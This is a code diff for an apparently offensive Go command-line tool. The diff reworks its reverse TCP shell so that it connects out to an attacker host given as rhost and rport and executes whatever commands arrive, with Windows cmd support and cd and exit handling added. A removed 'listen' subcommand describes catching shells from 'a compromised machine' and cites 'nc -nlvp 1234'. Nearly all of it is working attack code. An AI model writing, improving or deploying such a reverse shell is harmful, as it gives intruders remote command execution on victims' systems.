@@ -10,6 +10,7 @@ import (
 	"bufio"
 	"os/exec"
 	"strings"
+	"runtime"
 
 	"github.com/thatisuday/commando"
 )
@@ -74,7 +75,8 @@ func pivot(args map[string]commando.ArgValue, flags map[string]commando.FlagValu
 	}
 }
 
-func shell(args map[string]commando.ArgValue, flags map[string]commando.FlagValue) {
+func initiateShellConnection(args map[string]commando.ArgValue) (net.Conn, error) {
+	// Establish Connection
 	targetAddress := args["rhost"].Value
 	targetPort := args["rport"].Value
 	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", targetAddress, targetPort))
@@ -82,36 +84,100 @@ func shell(args map[string]commando.ArgValue, flags map[string]commando.FlagValu
 		fmt.Printf("Connection established with %s\n", targetAddress)
 	}
 	check(err)
-	defer conn.Close()
+	return conn, err
+}
 
-	sendCommand := func(cmd string) {
+func createShell(conn net.Conn) func(string){
+	execCommand := func(osString string, args []string) *exec.Cmd{
+		switch osString {
+		case "windows":
+			// Unfortunately, most Windows commands are shell builtins rather than exe's
+			// so we have to get OS specific. :(
+			args = append([]string{"/c"}, args...) // prepend
+			return exec.Command("cmd", args...)
+		default:
+			return exec.Command(args[0], args[1:]...)
+		}
+	}
+
+	handleBuiltins := func(cmd string, args []string) bool {
+		switch args[0] {
+		case "cd":
+		    // 'cd' to home dir with empty path not yet supported.
+		    if len(args) < 2 {
+		    	conn.Write([]byte("path required\n"))
+		        return true
+		    }
+		    // Change the directory and return the error.
+		    err := os.Chdir(args[1])
+		    if err != nil {
+		    	conn.Write([]byte(err.Error() + "\n"))
+		    }
+		    return true
+		case "exit":
+		    os.Exit(0)
+		}
+		return false
+	}
+
+	handleCommand := func(cmd string) {
 		args := strings.Fields(cmd)
 
-		command := exec.Command(args[0], args[1:]...)
+		if handleBuiltins(cmd, args) {
+			return
+		}
 
-	 	command.Stderr = conn
+		command := execCommand(runtime.GOOS, args)
+		command.Stderr = conn
 	 	command.Stdout = conn
-	 	err = command.Run()
+	 	err := command.Run()
 	 	if err != nil {
 	  		fmt.Fprintln(conn, err)
 	 	}
+		
 	}
 
+	return handleCommand
+}
+
+func getShellPrompt() string {
+		prompt := " >"
+
+		currentWorkingDirectory, err := os.Getwd()
+	    if err != nil {
+	        log.Fatal(err)
+	    }
+
+		if len(currentWorkingDirectory) > 0 {
+			prompt = currentWorkingDirectory + prompt
+		}
+
+		return prompt
+	}
+
+func shell(args map[string]commando.ArgValue, flags map[string]commando.FlagValue) {
+	// Initiate Connection
+	conn, _ := initiateShellConnection(args)
+	defer conn.Close()
+
+	// Create Shell
+	shell := createShell(conn)
+
+	// Shell loop
 	for {
-		fmt.Fprint(conn, "$ ")
+		prompt := getShellPrompt()
+
+		fmt.Fprintf(conn, "%s ", prompt)
 		remoteCmd, err := bufio.NewReader(conn).ReadString('\n')
 		check(err)
 		if err != nil {
             return
         }
+
 		if newCmd := strings.TrimSuffix(remoteCmd, "\n"); len(newCmd) > 0 {
-			sendCommand(newCmd)
+			shell(newCmd)
 		}
 	}
-}
-
-func listen(args map[string]commando.ArgValue, flags map[string]commando.FlagValue) {
-	
 }
 
 func handleRequest(client net.Conn, targetAddress string, protocol string) {
@@ -181,14 +247,6 @@ func main() {
 		AddArgument("rport", "TCP port listening on the attacker host (default: 1234)", "1234").
 		AddArgument("lport", "TCP port to send from (default: 22)", "22").
 		SetAction(shell)
-
-	commando.
-		Register("listen").
-		SetShortDescription("listens for a reverse TCP shell").
-		SetDescription("This command opens a port to listen for a reverse shell sent from a compromised machine.\nAlternatively, you can use: `nc -nlvp 1234` if netcat is available").
-		AddArgument("rhost", "IP address of the attacker's host (e.g. 192.168.0.1)", "").
-		AddArgument("lport", "TCP port to send from (default: 1234)", "1234").
-		SetAction(listen)
 
 	commando.Parse(nil)
 
